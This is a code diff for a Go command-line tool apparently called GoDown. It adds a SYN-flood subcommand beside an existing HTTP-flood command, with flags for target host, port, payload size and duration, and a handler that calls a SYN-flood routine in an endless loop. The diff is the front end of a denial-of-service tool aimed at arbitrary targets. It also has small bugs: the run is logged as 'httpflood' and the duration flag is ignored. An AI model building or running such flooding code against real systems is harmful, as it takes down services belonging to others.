@@ -41,6 +41,17 @@ func main() {
 
 		os.Stdout.Write([]byte("\033[2J\033[1;1H"))
 		handleHttpFlood(httpflood, url, t, g, w)
+	case "synflood":
+		synflood := flag.NewFlagSet("synflood", flag.ExitOnError)
+
+		url := synflood.String("url", "", "URL/IP/HOSTNAME to use")
+		p := synflood.Int("p", 80, "Port to use default 80")
+		pl := synflood.Int("pl", 10, "Payload size default 10")
+		t := synflood.String("t", "syn", "Attack type default syn")
+		d := synflood.Int64("d", 60, "Duration in sec default 60")
+
+		os.Stdout.Write([]byte("\033[2J\033[1;1H"))
+		handleSynFlood(synflood, url, p, pl, t, d)
 	case "history":
 		history := flag.NewFlagSet("history", flag.ExitOnError)
 
@@ -52,7 +63,14 @@ func main() {
 func handleHttpFlood(c *flag.FlagSet, url *string, t *int64, g *int, w *int) {
 	c.Parse(os.Args[2:])
 	if *url == "" {
-		fmt.Println("Usage: -url <url/ip/hostname>")
+		fmt.Println("Usage: GoDown [arguments]")
+		fmt.Println("")
+		fmt.Println("Arguments:")
+		fmt.Println("  -url 	- Url/ip/hostname")
+		fmt.Println("  -t 		- timeout in sec")
+		fmt.Println("  -g 		- amount of goroutines")
+		fmt.Println("  -w 		- time to wait between requests in ms")
+		fmt.Println("")
 		os.Exit(1)
 	}
 
@@ -158,6 +176,40 @@ func handleHttpFlood(c *flag.FlagSet, url *string, t *int64, g *int, w *int) {
 			}
 		}
 	}
+}
+
+func handleSynFlood(c *flag.FlagSet, url *string, port *int, payload *int, attackType *string, d *int64) {
+	c.Parse(os.Args[2:])
+	if *url == "" {
+		fmt.Println("Usage: GoDown [arguments]")
+		fmt.Println("")
+		fmt.Println("Arguments:")
+		fmt.Println("  -url 	- Url/ip/hostname")
+		fmt.Println("  -p 		- Port")
+		fmt.Println("  -pl 		- payload size")
+		fmt.Println("  -t 		- attack type")
+		fmt.Println("  -d 		- duration in sec")
+		fmt.Println("")
+		os.Exit(1)
+	}
+
+	args := []string{
+		fmt.Sprintf(`-url "%s"`, *url),
+		fmt.Sprintf("-p %d", *port),
+		fmt.Sprintf("-pl %d", *payload),
+		fmt.Sprintf("-t %s", *attackType),
+		fmt.Sprintf("-d %d", *d),
+	}
+
+	storeHistory("httpflood", args)
+
+	for {
+		if err := attacks.StartSynFlood(*url, *port, *payload, *attackType); err != nil {
+			fmt.Println(err)
+			os.Exit(1)
+		}
+	}
+
 }
 
 func handleHistory(c *flag.FlagSet) {
